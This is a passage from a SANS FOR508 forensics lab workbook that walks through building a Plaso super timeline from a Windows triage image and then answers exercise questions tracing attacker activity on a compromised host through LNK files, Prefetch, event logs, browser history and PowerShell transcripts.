At this point, we need to copy the rd01 VHDX triage image into this /cases/triage directory. There are several options for
doing so based on the guidance in the VM File Transfer Options guide (note that the image is available on ISO "B"). In this
example, we will show the option for "Using the SMB Share on the Linux VM" to copy the VHDX image from the Windows VM
into the Linux VM. The guide shows some troubleshooting steps which may be necessary in some cases. Assuming the
connectivity works as expected, the copy should be very straightforward.
• While logged into the FOR508 Windows VM, browse to \\SIFTWORKSTATION (or \\<SIFT-IP-address> ) in File Explorer.
Then navigate to cases > triage :

© 2023 SANS Institute

.

139

• In another File Explorer window, navigate to G:\SRL_Evidence\triage and then drag-and-drop the rd01-triage.vhdx ﬁle
to \\SIFTWORKSTATION\cases\triage to copy the image ﬁle, as shown here:

Expected results

.

root@siftworkstation:/cases/triage# ls -lh
total 5.5G
-rwxr--r-- 1 sansforensics sansforensics 5.5G Jul 11 02:58 rd01-triage.vhdx
root@siftworkstation:/cases/triage#

• When the copy completes, go back to the Linux SIFT VM and run ls -lh from the Terminal window. You should now see
a listing similar to the following:

We are now ready to proceed with processing the rd01-triage.vhdx triage image.

140

© 2023 SANS Institute

.

Note
log2timeline.py can parse VHDX ﬁles directly, assuming the proper libraries are installed on the analyst's host (as they

are in the SIFT). Therefore, there is no real need to mount the VHDX image as we are about to do. However, we also want
to demonstrate how to access VHDX contents in Linux. These instructions will ultimately show how to point
log2timeline at a directory with collected ﬁles and parse all the ﬁles within it.

4. We will use the virtualization tool qemu-nbd to mount the VHDX image ﬁle. We ﬁrst have to ensure the nbd (Network Block
Device) kernel module is loaded and enable partition support (up to 16 partitions) via the

max_part parameter:

modprobe nbd max_part=16

5. Next, we run qemu-nbd -c to connect the ﬁrst NBD device (nbd0) to the VHDX disk image:
qemu-nbd -c /dev/nbd0 rd01-triage.vhdx

Linux now effectively sees /dev/nbd0 as a disk device.
6. We now run partprobe to inform the operating system of partition table changes (updates) for the /dev/nbd0 device:
partprobe /dev/nbd0

7. Finally, let's make a new directory at /mnt/rd01-triage and then mount the ﬁrst partition of the nbd device (which
corresponds to the ﬁrst partition of the VHDX image) to that directory:

.

mkdir /mnt/rd01-triage
mountwin /dev/nbd0p1 /mnt/rd01-triage

Now check the contents of the mount point /mnt/rd01-triage to verify we see the ﬁles and folders inside the VHDX image.
ls /mnt/rd01-triage

Expected results

root@siftworkstation:/cases/triage# ls /mnt/rd01-triage
'$AttrDef' '$LogFile'
'$Volume'
'$BadClus' '$MFTMirr'
2023-07-11T02_44_14_5185139_CopyLog.csv
'$Bitmap'
'$RECYCLE.BIN'
C
'$Boot'
'$Secure'
LongFileNames
'$Extend'
'$UpCase'
'System Volume Information'
root@siftworkstation:/cases/triage#

Using Plaso via Docker Containers
The Plaso toolkit is a Python-based set of scripts for accomplishing robust forensic timeline generation. Because it's Pythonbased, it conveniently runs on multiple platforms. However, there are a number of dependencies to account for when installing

© 2023 SANS Institute

.

141

Plaso. Furthermore, when later upgrading, it can be even more challenging to reconcile the various dependencies. For these
reasons, the project developers generally recommend using their prebuilt Docker images, which include the proper dependencies
for each release of Plaso. This makes it easy to upgrade, or even downgrade when necessary. Therefore, we'll focus on the using
the Docker image for Plaso in this optional lab for Linux. For more details on using Plaso via Docker, visit their documentation at
https://plaso.readthedocs.io/en/latest/sources/user/Installing-with-docker.html
In order to show how speciﬁc versions of Plaso can be used via Docker, we will process the RD01 triage data with a particular
version of Plaso: 20230520 . This is the same version we used to create the precooked super timeline used in Lab 4.4: Super
Timeline Analysis. If you would like to update this version in the future, you can get the most recent Plaso release by specifying
the image as log2timeline/plaso:latest instead. (The Plaso team maintains current and past versions at https://
hub.docker.com/r/log2timeline/plaso/tags.)
Let's verify the version we are using as follows:
docker run log2timeline/plaso:20230520 log2timeline.py --version

Expected results

root@siftworkstation:/cases/triage# docker run log2timeline/plaso:20230520 log2timeline.py --version
plaso - log2timeline version 20230520
root@siftworkstation:/cases/triage#

Lab -- Create the Super Timeline and Prep for Analysis

.

Note
The remaining steps take considerable time to ﬁnish and are not intended to be accomplished in class. Depending on the
speed of your system, the remaining steps could take an hour or more to complete.

1. We begin by parsing the contents of the mounted VHDX image using log2timeline inside a Docker container:
docker run -v /cases:/cases -v /mnt/rd01-triage:/mnt/rd01-triage log2timeline/plaso:20230520
log2timeline.py --timezone 'EST5EDT' --parsers 'win7,!filestat' --storage_file /cases/triage/rd01triage.plaso /mnt/rd01-triage/C/

142

© 2023 SANS Institute

.

Command line notes
The command line parameters accomplish the following:
• docker run -v /cases:/cases -v /mnt/rd01-triage:/mnt/rd01-triage log2timeline/plaso:20230520
log2timeline.py starts a Docker container from the log2timeline/plaso:20230520 image and runs the
log2timeline.py command within it. It also binds the /cases directory in the SIFT VM to a directory created in the

container also named /cases . -v /mnt/rd01-triage:/mnt/rd01-triage accomplishes the same thing, but to the /
mnt/rd01-triage directory. This allows us to run the

log2timeline.py command in the container and have it access

the paths we want on the host.
• Note that the order of the -v mount is /path/on/host:/path/in/container .
• You can read more about bind mounts at https://docs.docker.com/storage/bind-mounts/
• --timezone 'EST5EDT' speciﬁes the timezone of the subject system. Specifying the source system's timezone is
necessary to correctly parse timestamps for artifacts that store their times in local time. Most Windows artifacts store
their times in UTC, but not all. Note that you can run --timezone list to get the list of available codes.
• --parsers 'win7,!filestat' -- we use the win7 parser preset and exclude the filestat plugin. The filestat
plugin is not a great option when running log2timeline against selected ﬁles in a triage image, since it simply
extracts the timestamps of the ﬁles which log2timeline parses (i.e., the relatively small number of ﬁles in the triage
image). It does not parse the MFT to extract timestamps of all ﬁles that were on the subject system. However, we
want to include all the timestamps, so instead of using filestat here, we can use a workaround to separately add
the ﬁle system timeline data we previously generated with MFTECmd .
• Note that log2timline does have it's own MFT parser named mft . It works, but it's output is very verbose and
diﬃcult to review in the CSV format that we use in this class. So we prefer the more concise output from MFTECmd ,
which we will add to the timeline next.
• -storage_file /cases/triage/rd01-triage.plaso /mnt/rd01-triage/C/ directs log2timeline to parse all ﬁles

.

(recursively by default) from /mnt/rd01-triage/C/ and store the parsed data in storage ﬁle /cases/triage/rd01triage.plaso .

2. The next step is to add in the ﬁle system timeline body ﬁle we created with

MFTECmd in Lab 4.2. However, before we add in the

ﬁle system timestamps, we are going to ﬁlter out noisy events as we did previously.

Attention
As mentioned in Lab 4.2, be careful to review any noise ﬁltering terms before implementing them in a real case. The set of
terms used in our timeline_noise.txt ﬁle is pertinent to the Stark Research Labs environment. The terms you ﬁlter (if
any) may need to be different.

grep -a -v -i -f /cases/precooked/timeline/timeline_noise.txt /cases/precooked/timeline/rd01-mftecmd.body
> /cases/triage/rd01-mftecmd-final.body

We also would like to change the forward slashes to backslashes to match the Windows path style. We can do that with the
following sed command:

© 2023 SANS Institute

.

143

sed -i 's/\//\\/g' /cases/triage/rd01-mftecmd-final.body

We are now ready to import in the ﬁnal ﬁle system timeline data into log2timeline :
docker run -v /cases:/cases log2timeline/plaso:20230520 log2timeline.py --parsers 'mactime' --storage_file /
cases/triage/rd01-triage.plaso /cases/triage/rd01-mftecmd-final.body

Command line notes
The main differences with this command are:
• We did not need to add a second -v bind mount because all the data we need to access in the container from the
host ﬁlesystem is found in /cases .
• We did not need to specify a --timezone because the only artifact we are parsing here is from the MFT, which is
already in UTC.
• --parsers 'mactime' -- this parser ingests the body ﬁle information collected from the earlier run of MFTECmd .

3. After the log2timeline commands are complete, we have a Plaso database ﬁle with artifacts ready to export. To get the data
exported into a CSV or other format for timeline review, we use psort.py . Run the following command to export the data to
CSV:

.

docker run -v /cases:/cases log2timeline/plaso:20230520 psort.py --output-time-zone 'UTC' -o l2tcsv -w /
cases/triage/rd01-triage.csv /cases/triage/rd01-triage.plaso "(((parser == 'winevtx') and (timestamp_desc
== 'Creation Time')) or (parser != 'winevtx')) and ( date > datetime('2023-01-01T00:00:00') AND date <
datetime('2023-01-27T00:00:00'))"

144

© 2023 SANS Institute

.

Command line notes
There's a lot to this command. Let's break it down:
• The Docker-speciﬁc part of the command ( docker run -v /cases:/cases log2timeline/plaso:20230520 ) is the
same as the second run of

log2timeline.py above, except this time we are running psort.py inside the container.

• --output-time-zone 'UTC' will create the super timeline in UTC time.
• -o l2tcsv -w /cases/triage/rd01-triage.csv /cases/triage/rd01-triage.plaso generates a CSV output ﬁle
named rd01-triage.csv based on the parsed data in rd01-triage.plaso
• "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser != 'winevtx')) and ( date >
datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00'))" ﬁlters the output for only

"winevtx" Creation Time events, thereby ignoring the "winevtx" Content Modiﬁcation Time events. Furthermore, it
extracts all other parser types, and it ﬁlters everything to the time range of interest for our case.
Note
Technically speaking, the Windows .evtx event log ﬁles contain two timestamps per event: Creation Time and
Content Modiﬁcation Time. The Creation Time is the time when each event is generated and it's stored in the XML
data of the event log entries. In almost every case, this is the only timestamp you will care about when analyzing
Windows event logs. Therefore, we perform noise reduction here by ﬁltering out the extraneous "winevtx" Content
Modiﬁcation Time entries. For more information on the two event log timestamps, see the article "Export corrupts
Windows Event Log ﬁles" at https://blog.fox-it.com/2019/06/04/export-corrupts-windows-event-log-ﬁles/.

4. You now have a super timeline that is ready to review. For our purposes, however, we'll take one additional step to remove
some of the noisier Windows event logs and events. The ﬁltering process is implemented via a PowerShell script that includes

.

a list of Event ID numbers we want to retain. Additionally, there is a ﬁlter ﬁle telling the script which source event log ﬁles to
keep. Said another way, for an event to be retained, it has to be from one of the event log ﬁles speciﬁed in
EventLogs2Process.txt AND the event has to have an event ID in the list of event ID numbers in the script

Filter-

Timeline_Events.ps1 .

Attention
Effective data reduction is an important aspect of forensics and incident response. With IR in particular, we need to be
quick, but also accurate. So, ﬁltering our data for noise reduction is an important technique, but we must do it with care
and always be cognizant of what we may have missed in the effort to speed up our analysis. That said, we do recommend
incorporating data ﬁltering techniques into your investigations, but pay close attention to what you are ﬁltering.
For example, our list of terms ﬁltered from the ﬁle system body ﬁle earlier in the lab may not be relevant to your
investigation. The same is true for the event logs we will ﬁlter next. We've built the ﬁlter list based on events we want to see
(i.e., the events covered in class), but it's certainly possible that your organization has enabled other Windows events that
should be retained as well. Also, this list is primarily pertinent for end-user host systems, and perhaps some typical server
roles. More specialized roles, such as domain controllers, Exchange servers, SQL servers, etc., likely require a different ﬁlter
list...if any ﬁlter list at all. Think of this ﬁlter as similar to pre-ﬁltering data before ingesting into a SIEM.

© 2023 SANS Institute

.

145

Let's take a quick look at both the script and the ﬁlter ﬁle. Run the following command to open the PowerShell script

Filter-

Timeline_Events.ps1 in Gedit. Be sure to read the description information and notice the list of Event IDs currently speciﬁed

to retain.

.

gedit /opt/event-log-filter/Filter-Timeline_Events.ps1 &

Next, open the EventLogs2Process.txt with Gedit using the following command.
gedit /opt/event-log-filter/EventLogs2Process.txt &

Here we specify which Windows event log ﬁles to consider for inclusion. If an event log is not listed here, then none of its
events will be retained, regardless of event ID number.

146

© 2023 SANS Institute

.

5. Now let's run the script against the output CSV from psort. We've installed PowerShell in the Linux SIFT. PowerShell scripts
can be run via the pwsh command. Run the following command from your standard Bash Terminal window:
pwsh /opt/event-log-filter/Filter-Timeline_Events.ps1 -InputPath /cases/triage/rd01-triage.csv EventLogPath /opt/event-log-filter/EventLogs2Process.txt -OutputPath /cases/triage/rd01-supertimeline.csv

The script has a lot of events to churn through, so it will likely take close to 5 minutes to complete. When it ﬁnishes, it will

.

report number of events in the original timeline CSV and the number of events in the ﬁltered CSV.

You should see that the ﬁnal super timeline has removed more than 400,000 events! Speciﬁcally, it removed a large number
of Windows event logs that are unlikely to be pertinent to our case...but not impossible! When in doubt, you still have the
original rd01-triage.csv output from psort to review too.
6. Copy the /cases/triage/rd01-supertimeline.csv ﬁle to your FOR508 Windows VM and open it with Timeline Explorer. Refer
to the VM File Transfer Options guide for various data transfer techniques.

Lab Takeaways
• Log2timeline is not a quick process to run.
• Compare the length of time to create a super timeline versus a ﬁlesystem timeline.
• However, the additional context we obtain through the super timeline analysis is very powerful, as you will see in Lab 4.4:
Super Timeline Analysis.

© 2023 SANS Institute

.

147

Lab 4.4: Super Timeline Analysis
Objectives
1. Conduct a detailed super timeline analysis of a compromised system.
2. Appreciate the diversity of forensic artifacts present in a super timeline.
3. Understand timeline colorization and focus on speciﬁc forensic artifacts to answer important questions.
4. Pivot on indicators and gain experience performing contextual analysis of artifacts.

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics
2. Use Timeline Explorer to open the precooked rd01-supertimeline.csv ﬁle found here:
• G:\Precooked\timeline\rd01-supertimeline.csv
3. Right-click on any column header and select Column Chooser from the drop-down menu of Timeline Explorer. A small dialog
will open named "Customization" (usually in the bottom right-hand corner) showing you any hidden columns. Find Short
Description and drag it to the column header to the immediate left of the "Long Description". We will use both description

.

columns in the upcoming lab.

148

© 2023 SANS Institute

.

.
Note
Super timelines can take hours to create, so to maximize time in class spent on honing analysis skills we will use a previously
created timeline. When you need to create your own super timeline in the future, the step-by-step guides in both Linux and
Windows are provided in the exercises prior to this one.

Lab Questions
Pivoting Around Indicators of Compromise
1. Create a ﬁlter in the Short Description column for the folder windows\update. You previously viewed artifacts related to this
folder within the ﬁle system timeline. Take a minute or two to appreciate the added diversity of artifacts and information
available for this folder in the super timeline format. Notice items colored green (ﬁle and folder opening) and red (application
execution). You can see the color legend by selecting Help -> Legend in Timeline Explorer.

© 2023 SANS Institute

.

149

What additional types of data do you see for C:\Windows\Update that were not present in the ﬁle system timeline? (Hint: the
very important Source Description column describes the Plaso plugin that parsed each entry)

.

________________________________________________________________

150

© 2023 SANS Institute

.

Solution
• AppCompatCache (Shimcache)
• Recycle Bin
• OLECF Dest list entry (a fancy term for Windows Jump Lists)
• Windows Shortcut (LNK ﬁle parsing)
• Bodyﬁle data is imported from the File System Timeline. You could replicate your ﬁle system timeline by ﬁltering only

.

for this source description type.

2. Which user account opened the folder C:\Windows\Update ?
Hint 1
You will need to look outside the "Short Description" column.
Hint 2
The File Name column is the source of truth for what artifact was parsed by Plaso.
________________________________________________________________

© 2023 SANS Institute

.

151

Solution
The LNK ﬁle for C:\Windows\Update was saved to the wacsvc proﬁle indicating this user account opened the folder.

3. Document some folders that used to be present in C:\Windows\Update :
________________________________________________________________
________________________________________________________________

.

________________________________________________________________
________________________________________________________________
________________________________________________________________

152

© 2023 SANS Institute

.

Solution
The Windows Shortcut artifacts are incredible repositories of information. Through them we can identify ﬁles and folders
interacted with by a user, even if they no longer exist. We might never recover the ﬁles missing from C:\Windows\Update,
but folder and ﬁlenames alone can give insight into how the folder was used. Looking at the following information present
in LNK ﬁles gives a strong indication of extensive data collection by this user:
• C:\Windows\Update\rd01
• C:\Windows\Update\rd01\Research
• C:\Windows\Update\rd01\SRL-Eyes-Only
• C:\Windows\Update\rd02
• C:\Windows\Update\rd02\Documents
• C:\Windows\Update\rd02\Downloads
• C:\Windows\Update\rd03
• C:\Windows\Update\rd03\Documents
• C:\Windows\Update\rd03\Downloads
• C:\Windows\Update\rd04\
• C:\Windows\Update\rd04\Desktop
• C:\Windows\Update\rd04\Documents
• C:\Windows\Update\rd09\
• C:\Windows\Update\rd09\backup

• C:\Windows\Update\rd09\Downloads

.

• C:\Windows\Update\rd09\Desktop

• C:\Windows\Update\rec

© 2023 SANS Institute

.

153

4. What ﬁles were present in C:\Windows\Update\rec ?
________________________________________________________________
________________________________________________________________
Solution
• C:\Windows\Update\rec\dc01.shieldbase.com.txt
• C:\Windows\Update\rec\dev01.shieldbase.com.txt
• Looking at the SRL network map, clearly these are important systems! The timestamps for the LNK ﬁles indicate these
systems were likely accessed prior to 2023-01-17 19:07:41.

5. Set up a ﬁlter for \windows\update in Short Description and .exe in the global ﬁlter in the top-right of Timeline Explorer.
What other executables were once present in this folder other than EdgeUpdater.exe ?
________________________________________________________________
________________________________________________________________
Solution

• werfault.exe

.

• svchost.exe

• We identiﬁed these executables in the earlier Shimcache exercise, but it is useful to see them in context with other
artifacts. Notice there are no Bodyﬁle entries for these ﬁles since they are no longer present in the RD01 ﬁle system.

6. Clear your existing ﬁlters and now ﬁnd and pivot on the last modiﬁed time ("m") for the C:\Windows\Update folder. An easy
way to ﬁnd this ﬁle is to ﬁlter Source Description for Bodyﬁle and Short Description by \windows\update. Once you ﬁnd the
correct line, remember that you can pivot around ﬁltered ﬁndings by clicking on the item of interest within Timeline Explorer to
ﬁx your view on that line. Then clear all ﬁlters (CTRL-E) to look at other items present in the timeline nearby the item of
interest.
What interesting Registry Key was modiﬁed near the last modiﬁcation of C:\Windows\Update ? What hypothesis can you
devise by putting these two pieces of information together?
________________________________________________________________

154

© 2023 SANS Institute

.

________________________________________________________________
Solution
• [\Software\Sysinternals\SDelete] EulaAccepted was last modiﬁed approximately nine minutes before the last update
occurred in C:\Windows\Update.
• The EulaAccepted registry value is written the ﬁrst time a Sysinternals tool runs to record the acceptance of the user
agreement.
• One hypothesis could be that ﬁles within C:\Windows\Update were wiped by Sdelete sometime within that nine
minute window, with perhaps the last ﬁle removed on 2023-01-23 18:54:54.
• In the anti-forensics section of the course we will introduce the tools necessary to put this hypothesis to the test!

Using Event Logs
1. Putting event logs in context with other system artifacts is a powerful value-add of super timelines. Clear your ﬁlters with

.

CTRL-E and pivot around the proﬁle creation ("b" timestamp) of C:\Users\wacsvc .
Review the Event Log entries occurring at the same time as the creation of C:\Users\wacsvc . Document everything you can
derive from these events.

Tip
Event log entries are best reviewed by double-clicking the entry in the timeline to open up the "Details" pane. The "Long
Description" ﬁeld under details will attempt to format the event log in human readable form. Another alternative is to use
the timeline to identify event logs and times of interest and then review the full logs in a dedicated event viewer like Event
Log Explorer.

________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

155

Solution
• wacsvc Logon Type 10 (RDP)
• Logon was initiated from IP Address 172.16.6.18

.

• The account had administrative privileges (Security Event ID 4672)

Gaining Context Around Application Execution
1. Application execution artifacts make excellent pivot points within a timeline. Create a ﬁlter in the Short Description column
for a previously identiﬁed executable, Net1.exe
How many times was Net1.exe executed on RD01?
________________________________________________________________

156

© 2023 SANS Institute

.

Solution
• Net1.exe was executed three times on RD01
• This information is available because Plaso has a parser (named WinPrefetch) to extract embedded metadata out of
Prefetch ﬁles.

Can you identify every time Net1.exe was executed? Why or why not?
________________________________________________________________
________________________________________________________________
Solution
• This is a tricky question! Recall that the ﬁle system timestamps for Prefetch ﬁles tell us the ﬁrst and last time
something was executed.
• Also recall that Win8+ systems can contain up to eight embedded timestamps within .pf ﬁles. Plaso will parse these
ﬁles and create a timeline entry for each of the embedded timestamps.
• If you look closely at your ﬁltered timeline, you will see three "WinPrefetch" entries, one for each of the three execution
times of Net1.exe! This provides much more detailed information than what is available in a simple ﬁle system

.

timeline.

© 2023 SANS Institute

.

157

Tip
Adding the "Type" column can help with interpretation of some timestamps. To save screen space, this is not a column in
the default view. To add it, right-click on a column header and select "Column Chooser". Then drag "Type" to your preferred
location, such as next to the "macb" column.

2. Pivot on the ﬁrst execution of Net1.exe to see other artifacts recorded around that time. What other applications were
executed immediately before Net1.exe ?
________________________________________________________________
________________________________________________________________
Solution

• NETSTAT.EXE

.

• IPCONFIG.EXE

3. Can you determine what user account was most likely responsible for the execution of Net1.exe ?
________________________________________________________________

158

© 2023 SANS Institute

.

Solution
• The rsydow-a account authenticated multiple times around the executions of Net1, IPCONFIG, and NETSTAT.

4. A dvanced: What remote application was most likely used to execute Net1.exe ?

.

________________________________________________________________

© 2023 SANS Institute

.

159

Solution
• PowerShell transcripts nearby provide the ﬁrst clue.
• Did you happen to notice an Event ID 4103 entry with the other event logs used in the previous question? EID 4103 is
a PowerShell Script Logging event, and while its contents do not provide a lot of context in this example, the reference
to wsmprovhost.exe indicates PowerShell Remoting was in use during the time that Net1.exe was executed.
• This ﬁnding also correlates with the Event ID 4624 authentication events recording the Logon Type as "3", for

.

authentication over the network.

5. Continue moving forward through the timeline (later in time from the pivot point). What two additional executables can also
be tied to this cluster of activity?
________________________________________________________________
________________________________________________________________

160

© 2023 SANS Institute

.

Solution
• QUSER.EXE
• WHERE.EXE

Deep-Dive on Attacker Tools
1. Clear any existing ﬁlters using CTRL-E and Create a new ﬁlter in the Short Description column for a previously identiﬁed
executable, bhv.exe
How many times was bhv.exe executed on RD01?
________________________________________________________________
Solution

.

bhv.exe executed one time on RD01

2. What web browser was used to download bhv.exe ? Be careful with your answer!
________________________________________________________________

© 2023 SANS Institute

.

161

Solution
• The download information was sourced from the Microsoft Edge History ﬁle belonging to wacsvc.
• Note that the Plaso plugin name is "Chrome History." This is because Microsoft Edge (and many other browsers) are
written on top of the Chromium open-source browser project. To answer this question accurately you must review
source information in the "File Name" column.

3. Why are there duplicate entries for the downloading of bhv.exe ?
Hint 1
The Type column can help with interpretation of some timestamps. To add it, right-click on a column header and select
"Column Chooser". Then drag "Type" to your preferred location, such as next to the "macb" column.

.

Hint 2
Remember that the File Name column is the source of truth for what artifact was parsed by Plaso.
________________________________________________________________

162

© 2023 SANS Institute

.

Solution
• This is an important question! You can imagine a lazy investigator seeing this information in a timeline and putting in
their report that bhv.exe was downloaded four times. WRONG!
• The "Type" column illuminates that Plaso is recording both start and ﬁnish times for downloads, explaining two of the
entries. But duplicates still remain...
• The File Name column provides the ﬁnal piece of information. It looks like in addition to the primary Microsoft Edge
History ﬁle, there is a backup History ﬁle in a folder named "Snapshots." This is a relatively new addition to Chromiumbased browsers.
• The power of a tool like Plaso is that you might not even have been aware of backup folders for Edge, but you didn't
have to be! The ﬁle was identiﬁed, parsed, and automatically included in the timeline. In this case the items were
duplicate, but someday you might ﬁnd the only record of an important event in an obscure artifact like Chromium
Snapshot folders.

.

4. From what location was bhv.exe downloaded?
________________________________________________________________
Solution
• The "Long Description" column holds detailed information about each timeline entry.
• Notice website visits are colored orange by the viewer.
• bhv.exe was downloaded from a somewhat strange URL: secure.cshareﬁle.com

5. Clear any existing ﬁlters using CTRL-E and create a new global ﬁlter for cshareﬁle. What else is related to this ﬁnding?
________________________________________________________________

© 2023 SANS Institute

.

163

Solution
px.exe and ph.exe were also downloaded from secure.cshareﬁle.com, about six days later. This looks like an attacker tool
server!

Leveraging Browser Forensics
1. Clear any existing ﬁlters using CTRL-E and ﬁlter the Source Description column for Chrome History. Brieﬂy review the ﬁltered

.

results.

• There are a lot of browser history events in this timeline, so add a global ﬁlter (top-right of Timeline Explorer) for wacsvc to
limit results to just that account.
• What Stark Research Labs (SRL) system was accessed by wacsvc via a web browser?
________________________________________________________________

164

© 2023 SANS Institute

.

Solution
Several visits to system DEV01 are present in the wacsvc browser history on 2023-01-17.

• A dvanced: Can you determine the web application accessed on that SRL system?
________________________________________________________________
Solution
You might recognize "(Elastic)" and associated pages in the URLs visited on DEV01. Perhaps the easiest way to put
this together is doing an Internet search for "Elastic" and "Dashboard". This provides many relevant hits for

.

Elasticsearch. This is likely a database being accessed on DEV01 by the attacker, and an excellent ﬁnding!

2. Why are there ﬁle access artifacts (e.g. file:///C: ) intermingled with browser history information?
________________________________________________________________

© 2023 SANS Institute

.

165

Solution
This is a strange one. Since the early days of Internet Explorer (IE), that browser has stored the last 20 days of ﬁles opened
by each user. RD01 is a Windows 11 system that does not even have IE installed, but yet Win11 is still recording this
information! What happened here is Microsoft Edge imported browser history from other browsers for the user, and in
doing so, imported the IE local ﬁle access data. This is best proven via the Chrome artifact, Visit source:
[SOURCE_IE_IMPORTED] found in these entries.
If you are new to forensics, it is this type of information which makes a super timeline even more valuable as you increase
your knowledge of available forensic artifacts.

3. What Crypto Currency information found in the browser history could be used for tracking?
________________________________________________________________
Solution
• blockchain.info/address/18bSTrufLfuvHwS7JYuF626MBGULSmxTgR
• www.blockchain.com/btc/address/18bSTrufLfuvHwS7JYuF626MBGULSmxTgR
• The pages being visited here look a lot like a Bitcoin address. Crypto currency addresses can be used to tie attacks to

.

each other, and in some cases even help law enforcement ﬁnd the people behind an attack.

4. Select one of the found crypto currency site visits and clear your ﬁlters to pivot around it for more context. This might be a
longshot, but what do you see in the timeline that might have caused the attacker to search for this crypto information?
________________________________________________________________

166

© 2023 SANS Institute

.

Solution
C:\Windows\Update\rd04-history.csv was accessed less than two minutes before the searches for the Bitcoin address. It is
possible something discovered within the RD04 history ﬁle generated the interest in this speciﬁc BTC address. It is equally
possible it is just a coincidence. We would need more information (like the contents of rd04-history.csv) to be sure.

Optional Homework - Registry Artifacts
1. Early in the class we identiﬁed the execution of the built-in Windows tool regedit.exe. Clear any existing ﬁlters using CTRL-E
and create a new global ﬁlter for regedit.
• How many times was regedit.exe executed on this system?

.

________________________________________________________________
Solution
regedit.exe was executed once on this system.

• What user executed regedit.exe ?
________________________________________________________________

© 2023 SANS Institute

.

167

Solution
• Notice multiple Registry keys associated with this ﬁlter have references to HKEY_CURRENT_USER. This is a
reference to the currently logged in user's NTUSER.DAT registry hive. As examples, both UserAssist and the
RunMRU key are stored in the NTUSER.DAT hive for the user who executed the application.
• Looking at the "File Name" column for UserAssist and RunMRU we can see those keys are from the wacsvc
NTUSER.DAT hive.
• If this were a critical question, we could also pivot around the execution and look for nearby Event Log entries
showing logon sessions.

• A dvanced: What was regedit.exe used to access?
Hint
One of the associated Windows Registry keys contains the answer.

.

________________________________________________________________

168

© 2023 SANS Institute

.

Solution
• A little known, but useful registry key stores the last key visited by the Regedit application. This is a feature
allowing the application to return the user back to where they left off the last time the tool was in use.
• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit stores a value named
"LastKey" for this purpose.
• The "Last Key" stored for wacsvc was HKEY_CURRENT_USER\Environment. While not a very exciting ﬁnding, it is
possible this key could be interesting to an attacker since it stores user-speciﬁc environment variables like PATH
and default temp folders.
• We would also want to check for any modiﬁed keys around the time of Regedit execution by pivoting on the
execution time. In this case, there do not appear to be any items modiﬁed of obvious interest to an attacker so it

Optional Homework - Quarantine Files

.

is possible the attackers were using Regedit for information gathering purposes instead of key modiﬁcation.

1. We previously identiﬁed Windows Defender quarantine activity on RD01. Clear any existing ﬁlters using CTRL-E and create a
ﬁlter in the Long Description column for quarantine (a global ﬁlter would also work).
What is the earliest entry in the timeline matching the quarantine ﬁlter? What does it tell us?
________________________________________________________________
Solution
• Windows Defender event log ID 1117
• This event contains the ﬁrst detection of C:\Windows\System32\SRLUpdate.exe on 2023-01-25

© 2023 SANS Institute

.

169

2. Select and pivot on the Windows Event Log ID 1117 written on 2023-01-25 14:57:08. What interesting activity occurs
immediately after this collection of Windows Defender entries in the timeline?
Solution
• Security Event ID 4624 Type 9 (Runas) switching credentials from tdungan to wacsvc
• PowerShell execution
• PowerShell Script Block Logging (EIDs 4103 and 4104) showing suspicious PowerShell with encoded commands.

.

Optional Homework - PowerShell Transcripts
1. Plaso includes the ability to parse PowerShell Transcripts, bringing relevant information directly into the super timeline. This
capability could be immediately useful for RD01, a system containing many transcript ﬁles which would ordinarily require
one-by-one analysis.
• Clear any existing ﬁlters using CTRL-E and create a new global ﬁlter for transcript.
• What Plaso plugin other than "Bodyﬁle" presents the majority of timeline entries?
________________________________________________________________

170

© 2023 SANS Institute

.

Solution
PowerShell Transcript Event contains output from the Plaso plugin which parses transcript ﬁles.

2. Now clear your ﬁlters again with CTRL-E and ﬁlter the Source Description column for only PowerShell Transcript events.
• Review the transcript content from 2023-01-17. Do you see any activity which would be immediately interesting to our
investigation?

.

________________________________________________________________

© 2023 SANS Institute

.

171

Solution
A large amount of system enumeration commands were run via PowerShell on RD01 on 2023-01-17. This plugin
output makes it very clear this system is involved in suspicious activity.

3. Finally, take some time to look more closely at the PowerShell Transcript data.
• Can you ﬁnd evidence of an encoded PowerShell script being executed?
• Can you ﬁnd unusual PowerShell leveraging Microsoft Edge?

.

________________________________________________________________
________________________________________________________________

172

© 2023 SANS Institute

.

Solution
• Strange activity tied to Microsoft Edge can be found in the PowerShell Transcripts at 2023-01-23 15:19:35
• The only PowerShell encoded commands make an appearance at 2023-01-25 14:57:22

Lab Takeaways
We hope you enjoyed the whirlwind tour of the super timeline! Clearly these ﬁles can hold an immense amount of forensic
information. While overwhelming at ﬁrst, you will ﬁnd with practice they become one of the fastest ways to answer to critical
questions.

.

The super timeline greatly increased our knowledge of how C:\Windows\Update was used in the past:
• LNK ﬁles give a strong indication of extensive data collection:
• C:\Windows\Update\rd01
• C:\Windows\Update\rd01\Research
• C:\Windows\Update\rd01\SRL-Eyes-Only
• C:\Windows\Update\rd02
• C:\Windows\Update\rd02\Documents
• C:\Windows\Update\rd02\Downloads
• C:\Windows\Update\rec
• AppCompatCache data recorded two executables previously present:
• C:\Windows\Update\svchost.exe
• C:\Windows\Update\werfault.exe
With most of the ﬁles identiﬁed in C:\Windows\Update missing, it seems likely there was cleanup and/or anti-forensics activity
accomplished by the attackers.
• One hypothesis generated from the data is ﬁles could have been wiped by SDelete

© 2023 SANS Institute

.

173

• The last modiﬁcation of C:\Windows\Update occurred on 2023-01-23 18:54:54
Web browser forensics provided multiple items of interest to our investigation:
• bhv.exe was downloaded from a somewhat strange URL, secure.cshareﬁle.com
• px.exe and ph.exe were also downloaded from secure.cshareﬁle.com
• Information on a Bitcoin address was accessed by the attackers: blockchain.info/address/

.

18bSTrufLfuvHwS7JYuF626MBGULSmxTgR

174

© 2023 SANS Institute

.

Lab 4.5: Scaling Timeline Analysis with ELK
Objectives
The 508 SIFT Linux VM has an Elasticsearch ("ELK") container with super timeline data from all 30 SRL Windows hosts. The
purpose of the ELK installation is to provide another method for searching the timeline data using the power and speed of
Elasticsearch. This is a supplemental process and is not required to solve the ﬁnal challenge. However, searching the data with
ELK can provide eﬃciencies, so we provide this as an option to aid your analysis.

Lab Preparation
